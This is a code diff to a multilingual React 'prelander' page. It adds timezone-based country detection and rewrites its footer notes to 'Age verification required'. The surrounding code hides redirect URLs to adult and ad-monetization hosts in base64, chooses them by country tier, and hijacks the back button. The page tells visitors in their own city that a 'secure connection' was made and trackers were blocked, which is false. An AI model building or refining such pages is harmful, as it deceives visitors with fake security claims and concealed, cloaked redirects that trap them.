@@ -73,6 +73,30 @@ const BACKGROUND_TILES = [
   }
 ];
 
+const tzToCountryMap: Record<string, string> = {
+  "santo_domingo": "DO",
+  "madrid": "ES",
+  "mexico_city": "MX",
+  "monterrey": "MX",
+  "tijuana": "MX",
+  "bogota": "CO",
+  "buenos_aires": "AR",
+  "santiago": "CL",
+  "lima": "PE",
+  "caracas": "VE",
+  "quito": "EC",
+  "montevideo": "UY",
+  "asuncion": "PY",
+  "la_paz": "BO",
+  "guatemala": "GT",
+  "san_jose": "CR",
+  "tegucigalpa": "HN",
+  "managua": "NI",
+  "san_salvador": "SV",
+  "panama": "PA",
+  "san_juan": "PR"
+};
+
 const OBFUSCATED_URLS = {
   tier1: "aHR0cHM6Ly9wbGF5LmFkdWx0Zm9yY2UuY29tL3JlZGlyZWN0P3N1Yj1hZDUtcHJlbGFuZGVyLXRpZXIx", 
   tier2: "aHR0cHM6Ly9pbW9uZXRpeml0LmNvbS9zbWFydGxpbms/c3ViPWFkNS1wcmVsYW5kZXItdGllcjI=", 
@@ -98,13 +122,14 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
   const [progressText, setProgressText] = useState<string>("");
   const [timeLeft, setTimeLeft] = useState<number>(120); 
   const [displayCity, setDisplayCity] = useState(city);
+  const [displayCountry, setDisplayCountry] = useState(country);
   const [detectedLang, setDetectedLang] = useState<string>("es");
   
   const backgroundRef = useRef<HTMLDivElement>(null);
 
   // Decrypt helper for redirect actions
   const getDecryptedLink = () => {
-    const c = country.toUpperCase();
+    const c = displayCountry.toUpperCase();
     const tier1Countries = ["US", "GB", "CA", "AU", "NZ", "DE", "FR", "JP"];
     const tier2Countries = [
       "ES", "MX", "AR", "CO", "CL", "PE", "VE", "EC", "GT", "CR", "UY", "DO", "PR", "BO", "PY", "SV", "HN", "NI", "PA"
@@ -139,7 +164,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
     return () => {
       window.removeEventListener("popstate", handleBackButton);
     };
-  }, [country, detectedLang]);
+  }, [displayCountry, detectedLang]);
 
   // 2. CRO Hack: Tab Visibility Alert (Recuperación de pestaña inactiva)
   useEffect(() => {
@@ -195,7 +220,13 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
           const cityPart = tz.split("/")[1];
           const cleanedCity = cityPart.replace(/_/g, " ");
           if (cleanedCity) {
-            setDisplayCity(cleanedCity);
+            // Capitalize city beautifully
+            const capitalizedCity = cleanedCity.split(" ").map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(" ");
+            setDisplayCity(capitalizedCity);
+          }
+          const matchedCountry = tzToCountryMap[cityPart.toLowerCase()];
+          if (matchedCountry) {
+            setDisplayCountry(matchedCountry);
           }
         }
       } catch (e) {
@@ -203,8 +234,9 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       }
     } else {
       setDisplayCity(city);
+      setDisplayCountry(country);
     }
-  }, [city]);
+  }, [city, country]);
 
   const handleRedirect = () => {
     const targetUrl = getDecryptedLink();
@@ -230,7 +262,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       successTitle: "¡Acceso Concedido!",
       successExpiry: "Tu pase de acceso expira en:",
       successDesc: `¡Conexión Segura Establecida con Éxito! Hemos bloqueado los anuncios maliciosos y rastreadores para tu IP en ${displayCity}. Para proteger la privacidad de la red y liberar los streams en Ultra-HD permanentemente, activa tu Pase de Acceso Gratuito de forma segura.`,
-      successNote: "No se requiere tarjeta de crédito.",
+      successNote: "Verificación de edad requerida (18+)",
       btnFinal: "INICIAR PRUEBA ULTRA-HD AHORA",
       detailsText: "Verificado por Red de Seguridad Local"
     },
@@ -251,7 +283,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       successTitle: "Access Granted!",
       successExpiry: "Your access pass expires in:",
       successDesc: `Secure Connection Successfully Established! We have blocked malicious ads and trackers for your IP in ${displayCity}. To protect network privacy and unlock Ultra-HD streams permanently, activate your Free Access Pass securely.`,
-      successNote: "No credit card required.",
+      successNote: "Age verification required (18+)",
       btnFinal: "START ULTRA-HD TRIAL NOW",
       detailsText: "Verified by Local Security Network"
     },
@@ -272,7 +304,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       successTitle: "Accès Accordé!",
       successExpiry: "Votre pass d'accès expire dans:",
       successDesc: `Connexion sécurisée établie avec succès! Nous avons bloqué les publicités malveillantes et les traceurs pour votre IP à ${displayCity}. Pour protéger la confidentialité du réseau et débloquer définitivement les flux Ultra-HD, activez votre Pass d'Accès Gratuit en toute sécurité.`,
-      successNote: "Aucune carte de crédit requise.",
+      successNote: "Vérification d'âge requise (18+)",
       btnFinal: "DÉMARRER L'ESSAI ULTRA-HD MAINTENANT",
       detailsText: "Vérifié par le Réseau de Sécurité Local"
     },
@@ -293,7 +325,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       successTitle: "アクセス許可！",
       successExpiry: "アクセスパスの有効期限:",
       successDesc: `安全な接続が正常に確立されました！${displayCity}のIPアドレスに対する悪質な広告とトラッカーをブロックしました。ネットワークのプライバシーを保護し、Ultra-HD配信を永久に解放するには、今すぐ安全に無料アクセスパスを有効にしてください。`,
-      successNote: "クレジットカード不要",
+      successNote: "年齢確認が必要です (18歳以上)",
       btnFinal: "今すぐULTRA-HD体験を開始",
       detailsText: "ローカルセキュリティネットワーク認証済"
     },
@@ -314,7 +346,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       successTitle: "Accesso Consentito!",
       successExpiry: "Il tuo pass di accesso scade tra:",
       successDesc: `Connessione sicura stabilita con successo! Abbiamo bloccato gli annunci dannosi e i tracker per il tuo IP a ${displayCity}. Per proteggere la privacy della rete e sbloccare permanentemente gli stream Ultra-HD, attiva il tuo Pass di Accesso Gratuito in modo sicuro.`,
-      successNote: "Nessuna carta di credito richiesta.",
+      successNote: "Richiesta verifica dell'età (18+)",
       btnFinal: "AVVIA ORA LA PROVA ULTRA-HD",
       detailsText: "Verificato dalla Rete di Sicurezza Locale"
     },
@@ -335,7 +367,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       successTitle: "Acesso Concedido!",
       successExpiry: "O seu passe de acesso expira em:",
       successDesc: `Conexão segura estabelecida com sucesso! Bloqueamos anúncios maliciosos e rastreadores para o seu IP em ${displayCity}. Para proteger a privacidade da rede e liberar as transmissões em Ultra-HD permanentemente, ative o seu Passe de Acesso Gratuito com segurança.`,
-      successNote: "Não requer cartão de crédito.",
+      successNote: "Verificação de idade necessária (18+)",
       btnFinal: "INICIAR TESTE ULTRA-HD AGORA",
       detailsText: "Verificado pela Rede de Segurança Local"
     }
@@ -414,7 +446,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
           "--mouse-y": "-999px",
         } as React.CSSProperties}
       >
-        <div className="absolute inset-0 grid grid-cols-2 md:grid-cols-3 gap-4 p-4 opacity-85 blur-[16px] scale-105 select-none pointer-events-none">
+        <div className="absolute inset-0 grid grid-cols-2 md:grid-cols-3 gap-4 p-4 opacity-95 blur-[12px] scale-105 select-none pointer-events-none">
           {BACKGROUND_TILES.map((tile) => (
             <div key={tile.id} className="relative rounded-2xl bg-zinc-950 border border-white/10 overflow-hidden aspect-[4/3] flex flex-col justify-end p-4 shadow-inner">
               <img src={tile.img} alt={tile.title} className="absolute inset-0 w-full h-full object-cover saturate-150 contrast-125" />
@@ -458,7 +490,7 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
         </div>
       </div>
 
-      <div className="absolute inset-0 bg-[#040406]/65 backdrop-blur-[3px] z-10 pointer-events-none" />
+      <div className="absolute inset-0 bg-black/45 backdrop-blur-[1.5px] z-10 pointer-events-none" />
 
       <div className="absolute top-4 left-4 z-20 flex items-center gap-2 bg-black/75 backdrop-blur-md px-3.5 py-1.5 rounded-full border border-white/10 text-[10px] text-zinc-200 shadow-xl">
         <span className="relative flex h-2 w-2">
@@ -469,9 +501,9 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
       </div>
 
       <div className="absolute top-4 right-4 z-20 flex items-center gap-2 bg-black/75 backdrop-blur-md px-3.5 py-1.5 rounded-full border border-white/10 text-[10px] text-zinc-200 shadow-xl">
-        {country && (
-          <span className="text-sm leading-none" title={country}>
-            {getFlagEmoji(country)}
+        {displayCountry && (
+          <span className="text-sm leading-none" title={displayCountry}>
+            {getFlagEmoji(displayCountry)}
           </span>
         )}
         <span className="font-semibold text-rose-400 uppercase tracking-wide">{displayCity}</span>
